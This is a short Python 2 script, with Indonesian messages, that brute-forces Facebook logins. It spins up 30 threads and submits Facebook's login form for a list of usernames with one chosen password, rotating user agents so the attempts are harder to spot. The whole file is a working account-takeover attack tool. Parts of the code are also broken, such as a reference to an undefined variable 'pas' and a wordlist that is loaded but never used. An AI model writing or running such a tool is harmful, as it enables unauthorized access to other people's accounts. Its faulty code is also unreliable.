# -*- coding UTF-8 -*-
# Created by : Iqbal Dev

from useragents import user_agents
from prettytable import PrettyTable
import os, sys, time, random, cookielib, mechanize, threading
s = '   Suksess... \n Password Found \n'

th = []
con = 0

def jalan():
	global lis, Password

	Password = raw_input(" Masukkan Password : ")
	try:
		lis = open('pass.txt', 'r')

		for dev in range(30):
			Dev = threading.Thread(target=br_dev, args=())
			Dev.start()
			th.append(Dev)

		for iq in th:
			iq.join()

	except KeyboardInterrupt:
		print "\n Parah....."

def br_dev():

	global con, baris

	#user = raw_input("\n Masukkan Username : ")
	
	dev = mechanize.Browser()
	cok = cookielib.LWPCookieJar()
	dev.set_handle_robots(False)
	dev.set_handle_redirect(True)
	dev.set_cookiejar(cok)
	dev.set_handle_equiv(True)
	dev.set_handle_referer(True)
	dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	data = open('word.txt', 'r').readlines()
	lol = 'https://www.facebook.com/login.php?login_attempt=1'
	try:
		data_lis = open('pass.txt', 'r')
		baris = data_lis.read().split()
		while lis:
			user = lis.readline().strip()
			dev.addheaders = [('User_agent', random.choice(user_agents))]
			url = dev.open(lol)
			dev.select_form(nr = 0)
			dev.form['email'] = user
			dev.form['pass'] = Password
			mleb = dev.submit()
			meki = mleb.geturl()
			if con == len(baris):
				break

			elif meki != lol and (not 'login_attempt' in meki):
				x = PrettyTable()
				print s
				x.add_column("Username", [user])
				x.add_column("Password", [pas])
				print x
				sys.exit("\n Keluar....")

			else:

				con += 1

			print user		

		# except:
		# 	pass

	except KeyboardInterrupt:
		sys.exit("\n Keluar..... \n")


def main():
 	#Wordlist()
	jalan()

if __name__ == "__main__":
	main()




